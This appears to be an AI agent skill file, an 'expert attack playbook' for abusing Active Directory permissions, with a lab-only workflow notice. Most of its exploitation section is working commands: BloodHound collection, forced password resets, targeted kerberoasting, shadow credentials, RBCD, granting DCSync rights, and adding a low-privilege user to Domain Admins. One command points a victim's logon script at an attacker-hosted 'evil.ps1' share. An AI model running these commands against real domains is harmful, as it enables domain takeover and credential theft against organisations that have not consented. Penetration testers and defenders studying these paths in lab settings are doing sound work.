---
name: active-directory-acl-abuse
description: >-
  Active Directory ACL abuse playbook. Use when exploiting misconfigured AD permissions including GenericAll, WriteDACL, DCSync rights, shadow credentials, LAPS reading, GPO abuse, and BloodHound-guided attack paths.
---

# SKILL: AD ACL Abuse — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert AD ACL abuse techniques. Covers BloodHound enumeration, dangerous ACEs (GenericAll, WriteDACL, WriteOwner, etc.), DCSync, shadow credentials, targeted kerberoasting, group manipulation, LAPS, and GPO abuse. Pay particular attention to complex ACL chain exploitation and Cypher query patterns.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `active-directory-kerberos-attacks` for Kerberos attacks often chained with ACL abuse
- `active-directory-certificate-services` for certificate-based attacks after ACL exploitation
- `ntlm-relay-coercion` for relay attacks that can set ACLs (LDAP relay)
- `windows-lateral-movement` after gaining elevated AD access

### Advanced Reference

Also inspect [BLOODHOUND_PATHS.md](./BLOODHOUND_PATHS.md) when you need:
- Common BloodHound attack paths with Cypher queries
- Custom Neo4j queries for finding complex chains
- Data collection and ingestion tips

---

## 1. BLOODHOUND ENUMERATION

### Data Collection

```bash
# SharpHound (from Windows, domain-joined)
SharpHound.exe -c all --outputdirectory C:\temp --zipfilename bh.zip

# bloodhound-python (from Linux)
bloodhound-python -d domain.com -u user -p password -c all -dc DC01.domain.com -ns DC_IP

# Specific collection methods
SharpHound.exe -c DCOnly          # Fastest — only DC queries
SharpHound.exe -c Session         # Session data only (run periodically)
SharpHound.exe -c All,GPOLocalGroup  # Include GPO analysis
```

### Key BloodHound Queries (Built-in)

- "Find all Domain Admins"
- "Shortest Paths to Domain Admins from Owned Principals"
- "Find Principals with DCSync Rights"
- "Shortest Paths to Unconstrained Delegation Systems"
- "Find computers where Domain Users are Local Admin"

---

## 2. DANGEROUS ACE TYPES

| ACE | Effect on Users | Effect on Groups | Effect on Computers |
|---|---|---|---|
| **GenericAll** | Change password, set SPN, modify attributes | Add members | RBCD, LAPS read, all attributes |
| **GenericWrite** | Set SPN, modify attributes, shadow creds | Add members | RBCD, shadow credentials |
| **WriteDACL** | Grant yourself any permission | Same | Same |
| **WriteOwner** | Take ownership → then WriteDACL | Same | Same |
| **ForceChangePassword** | Reset password without knowing old | N/A | N/A |
| **AddMember** | N/A | Add self/others to group | N/A |
| **AllExtendedRights** | Force change password, read LAPS | N/A | Read LAPS, BitLocker keys |
| **ReadLAPSPassword** | N/A | N/A | Read local admin password |
| **WriteSPN** | Set SPN → targeted kerberoast | N/A | N/A |

---

## 3. ACE-SPECIFIC EXPLOITATION

### GenericAll on User

```powershell
# Option 1: Force change password
net user targetuser NewP@ss123 /domain

# Option 2: Targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
# → Kerberoast, then clear SPN

# Option 3: Shadow Credentials
Whisker.exe add /target:targetuser /domain:domain.com /dc:DC01

# Option 4: Set logon script
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

### GenericAll / GenericWrite on Computer

```bash
# RBCD attack
rbcd.py -delegate-from 'CONTROLLED$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC

# Shadow Credentials on computer
pywhisker.py -d domain.com -u user -p pass --target 'TARGET$' --action add --dc-ip DC
```

### WriteDACL

```powershell
# Grant DCSync rights to yourself
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity lowpriv -Rights DCSync

# Impacket
dacledit.py -action write -rights DCSync -principal lowpriv -target-dn "DC=domain,DC=com" DOMAIN/lowpriv:pass -dc-ip DC
```

### WriteOwner

```powershell
# Step 1: Take ownership
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity lowpriv

# Step 2: Grant WriteDACL to yourself (as owner)
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity lowpriv -Rights All

# Step 3: Now exploit as GenericAll
```

### ForceChangePassword

```bash
# Impacket
rpcclient -U 'DOMAIN/attacker%pass' DC01 -c "setuserinfo2 targetuser 23 'NewP@ss123!'"

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# net rpc
net rpc password targetuser 'NewP@ss123!' -U DOMAIN/attacker%pass -S DC01
```

### AddMember to Group

```powershell
# Add self to privileged group
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv

# Impacket
net rpc group addmem "Domain Admins" lowpriv -U DOMAIN/attacker%pass -S DC01
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. DCSYNC ATTACK
- 5. SHADOW CREDENTIALS
- 6. LAPS PASSWORD READING
- 7. GPO ABUSE
- 8. ACL ATTACK DECISION TREE
